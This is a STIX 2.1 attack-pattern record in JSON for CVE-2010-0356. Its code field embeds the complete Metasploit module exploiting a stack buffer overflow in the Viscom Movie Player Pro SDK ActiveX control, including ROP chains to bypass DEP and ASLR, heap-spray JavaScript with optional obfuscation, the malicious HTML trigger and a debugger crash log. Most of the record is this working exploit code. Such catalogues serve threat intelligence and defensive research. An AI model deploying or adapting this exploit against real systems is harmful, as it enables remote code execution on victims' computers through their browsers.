{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8d2be4f2-e941-4386-97d8-f0e654cb6476",
    "created": "2024-08-14T16:45:13.08845Z",
    "modified": "2024-08-14T16:45:13.088454Z",
    "name": "Viscom Software Movie Player Pro SDK ActiveX 6.8",
    "description": " Stack-based buffer overflow in the MOVIEPLAYER.MoviePlayerCtrl.1 ActiveX control in MoviePlayer.ocx 6.8.0.0 in Viscom Software Movie Player Pro SDK ActiveX 6.8 allows remote attackers to execute arbitrary code via a long strFontName parameter to the DrawText method.  The victim will first be required to trust the publisher Viscom Software. This module has been designed to bypass DEP and ASLR under XP IE8, Vista and Win7 with Java support.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/viscom_movieplayer_drawtext.rb",
            "external_id": "viscom_movieplayer_drawtext.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0356"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Viscom Software Movie Player Pro SDK ActiveX 6.8',\n      'Description'    => %q{\n          Stack-based buffer overflow in the MOVIEPLAYER.MoviePlayerCtrl.1 ActiveX control\n        in MoviePlayer.ocx 6.8.0.0 in Viscom Software Movie Player Pro SDK ActiveX 6.8 allows\n        remote attackers to execute arbitrary code via a long strFontName parameter to the\n        DrawText method.\n\n        The victim will first be required to trust the publisher Viscom Software.\n        This module has been designed to bypass DEP and ASLR under XP IE8, Vista and Win7\n        with Java support.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'shinnai', # Vulnerability discovery and original exploit\n          'TecR0c <roccogiovannicalvi[at]gmail.com>',  # Metasploit module\n          'mr_me <steventhomasseeley[at]gmail.com>' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-0356' ],\n          [ 'OSVDB', '61634' ],\n          [ 'EDB', '12320' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => false,\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\"\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [ 'Windows IE6-7', {} ],\n          [ 'Windows IE8 + JAVA 6 (DEP & ASLR BYPASS)', {} ]\n        ],\n      'DisclosureDate' => '2010-01-12',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [ OptBool.new('OBFUSCATE', [false, 'Enable JavaScript Obfuscation', true]) ])\n  end\n\n  # Prevent module from being executed in autopwn\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def junk(n=4)\n    return rand_text_alpha(n).unpack(\"L\")[0].to_i\n  end\n\n  def on_request_uri(cli, request)\n\n    # Set target manually or automatically\n    my_target = target\n    if my_target.name == 'Automatic'\n      agent = request.headers['User-Agent']\n      if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6\\.0/\n        my_target = targets[1] # XP\n      elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7\\.0/\n        my_target = targets[1] # XP\n      elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 8\\.0/\n        my_target = targets[2] # XP\n      elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 7\\.0/\n        my_target = targets[1] # Vista\n      elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 8\\.0/\n        my_target = targets[2] # Vista\n      elsif agent =~ /NT 6\\.1/ and agent =~ /MSIE 8\\.0/\n        my_target = targets[2] # Win7\n      end\n    end\n\n    sploit = rand_text_alpha(32)\n\n    pivot_addr = 0x1126cfe4\n\n    if my_target.name =~ /IE8/\n\n      pivot_rop =\n      [ # Pivot to get to ROP Chain\n        0x10015201, # POP EBP # RETN 08 [MOVIEP~1.OCX]\n        pivot_addr,\n        0x10014361, # MOV ESP,EBP # POP EBP # RETN 08    ** [MOVIEP~1.OCX]\n        junk, # ---------------------^\n        junk, # ----------------------^\n        junk, # ----------------------^\n        junk, # -------------------------------------^\n        junk, # -------------------------------------^\n        0x1001c049, # RETN (ROP NOP) [MOVIEP~1.OCX]\n      ].pack(\"V*\")\n\n      sploit << pivot_rop\n\n      code = [0x7C347F98].pack(\"V\") * 4 # RETN (ROP NOP) [MSVCR71.dll]\n\n      code <<\n      [ # MSVCR71.dll - rop chain generated with mona.py\n        0x7C37653D, # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN\n        0xFFFFFDFF, # Value to negate, will become 0x00000201 (dwSize)\n        0x7C347F98, # RETN (ROP NOP)\n        0x7C3415A2, # JMP [EAX]\n        0xFFFFFFFF, #\n        0x7C376402, # Skip 4 bytes\n        0x7C351E05, # NEG EAX # RETN\n        0x7C345255, # INC EBX # FPATAN # RETN\n        0x7C352174, # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN\n        0x7C344F87, # POP EDX # RETN\n        0xFFFFFFC0, # Value to negate, will become 0x00000040\n        0x7C351EB1, # NEG EDX # RETN\n        0x7C34D201, # POP ECX # RETN\n        0x7C38B001, # &Writable location\n        0x7C347F97, # POP EAX # RETN\n        0x7C37A151, # Ptr to &VirtualProtect() - 0x0EF\n        0x7C378C81, # PUSHAD # ADD AL,0EF # RETN\n        0x7C345C30, # Ptr to 'push esp' # ret\n      ].pack(\"V*\")\n\n      code << payload.encoded\n    else\n      code = payload.encoded\n      sploit << [pivot_addr].pack('V*')\n    end\n\n    # Payload in JS format\n    code = Rex::Text.to_unescape(code)\n    randnop = rand_text_alpha(rand(100) + 1)\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4)\n\n    spray = <<-JS\n    var heap_lib = new heapLib.ie(0x20000);\n    var code = unescape(\"#{code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x2000) nops += nops;\n    var offset = nops.substring(0, 0x800-0x20);\n    var shellcode = offset + code + nops.substring(0, 0x2000-offset.length-code.length);\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x7fb00-6)/2);\n\n    heap_lib.gc();\n\n    for (var i = 0; i < 0x200; i++) {\n    heap_lib.alloc(block);\n    }\n    JS\n\n    # Use heaplib\n    js = heaplib(spray)\n\n    # Obfuscate on demand\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    # Randomize the javascript variable names\n    vname = rand_text_alpha(rand(100) + 1)\n    strname = rand_text_alpha(rand(100) + 1)\n\n    html = %Q|<html>\n<object classid='clsid:F4A32EAF-F30D-466D-BEC8-F4ED86CAF84E' id='#{vname}'></object>\n<script>#{js}</script>\n<script language='vbscript'>\n\n#{strname} = \"#{sploit}\"\n\n#{vname}.DrawText 1, 1, 1, \"\", 1, #{strname}, True, True, True, 1, 1, 1, 1, 1, 1\n\n</script>\n</html>\n|\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, html)\n  end\n\nend\n=begin\n(78c.1d8): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=000079f3 ebx=00000000 ecx=0203f298 edx=7c90e4f4 esi=008de5c0 edi=0287f2f4\neip=41414141 esp=0203f300 ebp=0203f4a0 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\n41414141 ??              ???\n\n0:005> dd @esp\n0203f300  41414141 41414141 41414141 41414141\n0203f310  41414141 41414141 41414141 41414141\n0203f320  41414141 41414141 41414141 41414141\n0203f330  41414141 41414141 41414141 41414141\n0203f340  41414141 41414141 41414141 41414141\n0203f350  41414141 41414141 41414141 41414141\n0203f360  41414141 41414141 41414141 41414141\n0203f370  41414141 41414141 41414141 41414141\n=end\n",
    "x_mitre_disclosure_date": "2010-01-12",
    "x_mitre_platforms": [
        "win'"
    ]
}